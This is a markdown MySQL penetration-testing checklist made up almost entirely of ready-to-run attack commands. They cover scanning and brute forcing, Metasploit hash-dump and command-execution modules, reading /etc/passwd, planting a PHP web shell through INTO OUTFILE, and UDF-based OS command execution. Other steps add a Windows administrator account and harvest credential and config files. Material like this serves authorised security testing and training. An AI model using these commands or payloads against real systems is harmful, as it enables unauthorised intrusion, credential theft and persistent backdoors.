# MySQL Pentesting Checklist & Commands

## üéØ What am I realistically expecting to find here?

‚≠ê After enumerating MySQL (port 3306), I realistically expect to find:

- [ ] Default or weak credentials
- [ ] Anonymous or empty-password accounts
- [ ] User password hashes for offline cracking
- [ ] Sensitive schema/data exposure
- [ ] File read/write on the host
- [ ] Privilege escalation via UDFs or misconfigurations
- [ ] Ability to execute OS commands

---

## ‚úÖ MySQL Pentest Checklist

- [ ] **Port Scan & Service Detection**
  - Confirm port and version.
    ```
    nmap -sV -Pn -p3306 <IP>
    nmap --script=mysql-info -p3306 <IP>
    ```

- [ ] **Default & Anonymous Login Check**
  - Try direct connection with no password.
    ```
    mysql -u root
    mysql -u root -p
    mysql -h <IP> -u root
    mysql -h <IP> -u root@localhost
    ```

- [ ] **Nmap NSE Enumeration**
  - Use built-in scripts for comprehensive checks.
    ```
    nmap -sV -p3306 --script=mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 <IP>
    ```

- [ ] **Metasploit Modules**
  - Version scan:
    ```
    use auxiliary/scanner/mysql/mysql_version
    ```
  - Hash dumping (needs creds):
    ```
    use auxiliary/scanner/mysql/mysql_hashdump
    ```
  - Auth bypass & hash dump:
    ```
    use auxiliary/scanner/mysql/mysql_authbypass_hashdump
    ```
  - Schema dump (needs creds):
    ```
    use auxiliary/scanner/mysql/mysql_schemadump
    ```
  - Enum (needs creds):
    ```
    use auxiliary/admin/mysql/mysql_enum
    ```
  - Windows command exec (needs creds):
    ```
    use exploit/windows/mysql/mysql_start_up
    ```

- [ ] **Brute Forcing**
  - Use general brute-force strategies against MySQL:
    ```
    hydra -L users.txt -P passwords.txt mysql://<IP>
    ```

---

## ‚úÖ Manual Enumeration

- [ ] **Basic Enumeration Commands**
    ```sql
    show databases;
    use <database>;
    show tables;
    describe <table_name>;
    select version();
    select @@version();
    select user();
    select database();
    ```

- [ ] **Privilege & User Checks**
    ```sql
    select grantee, table_schema, privilege_type FROM information_schema.schema_privileges;
    select user, file_priv from mysql.user where user='root';
    ```

- [ ] **Read/Write Files**
    ```sql
    select load_file('/etc/passwd');
    select 1,2,"<?php echo shell_exec($_GET['c']);?>",4 into OUTFILE '/var/www/html/shell.php';
    ```

- [ ] **Command Execution**
    ```sql
    select do_system('id');
    \! sh
    ```

- [ ] **Interesting Payloads**
    ```sql
    CONVERT(unhex("6f6e2e786d6c55540900037748b75c7249b75"), BINARY)
    CONVERT(from_base64("aG9sYWFhCg=="), BINARY)
    ```

---

## ‚úÖ Privilege Escalation & Exploitation

- [ ] **Change Root Password**
    ```sql
    UPDATE mysql.user SET Password=PASSWORD('MyNewPass') WHERE User='root';
    UPDATE mysql.user SET authentication_string=PASSWORD('MyNewPass') WHERE User='root';
    FLUSH PRIVILEGES;
    ```

- [ ] **User Privilege Enumeration**
    ```sql
    select user();
    select user,password,create_priv,insert_priv,update_priv,alter_priv,delete_priv,drop_priv from mysql.user where user='<CURRENT_USER>';
    select User,Host,Password FROM mysql.user;
    select User,Host,authentication_string FROM mysql.user;
    ```

- [ ] **Privilege Escalation via UDF (Linux)**
    ```sql
    use mysql;
    create table npn(line blob);
    insert into npn values(load_file('/tmp/lib_mysqludf_sys.so'));
    select * from npn into dumpfile '/usr/lib/mysql/plugin/lib_mysqludf_sys.so';
    create function sys_exec returns integer soname 'lib_mysqludf_sys.so';
    select sys_exec('id > /tmp/out.txt');
    ```

- [ ] **Privilege Escalation via UDF (Windows)**
    ```sql
    USE mysql;
    CREATE TABLE npn(line blob);
    INSERT INTO npn values(load_file('C://temp//lib_mysqludf_sys.dll'));
    SELECT * FROM npn INTO DUMPFILE 'c://windows//system32//lib_mysqludf_sys_32.dll';
    CREATE FUNCTION sys_exec RETURNS integer SONAME 'lib_mysqludf_sys_32.dll';
    SELECT sys_exec("net user npn npn12345678 /add");
    SELECT sys_exec("net localgroup Administrators npn /add");
    ```

---

## ‚úÖ Post Exploitation

- [ ] **MySQL Command History**
    ```
    cat ~/.mysql_history
    ```

- [ ] **MySQL Configuration Files**
    - Linux:
        ```
        /etc/my.cnf
        /etc/mysql/my.cnf
        /var/lib/mysql/my.cnf
        ~/.my.cnf
        ```
    - Windows:
        ```
        C:\windows\my.ini
        <InstallDir>\mysql\data\
        ```
    - Debian Systems:
        ```
        cat /etc/mysql/debian.cnf
        ```

- [ ] **Extract Hashes from Files**
    ```
    grep -oaE "[-_\.\*a-Z0-9]{3,}" /var/lib/mysql/mysql/user.MYD | grep -v "mysql_native_password"
    ```

- [ ] **Enable Logging for Further Capture**
    - Edit:
        ```
        /etc/mysql/my.cnf
        ```
    - Example directives:
        ```
        general_log_file        = /var/log/mysql/mysql.log
        general_log             = 1
        ```

---

## ‚úÖ Advanced Attack: Client-Side Arbitrary File Reads

- **PoC**
    ```sql
    load data local infile "/etc/passwd" into table test FIELDS TERMINATED BY '\n';
    ```
    - Needs "local" keyword!
    - Useful reference: [Rogue-MySql-Server PoC](https://github.com/allyshka/Rogue-MySql-Server)

---

## ‚úÖ Shodan Dork

- [ ] Search for exposed MySQL servers:
    ```
    port:3306
    ```

---

## ‚úÖ Resources

- [HackTricks MySQL Guide](https://book.hacktricks.xyz/pentesting/pentesting-mysql)
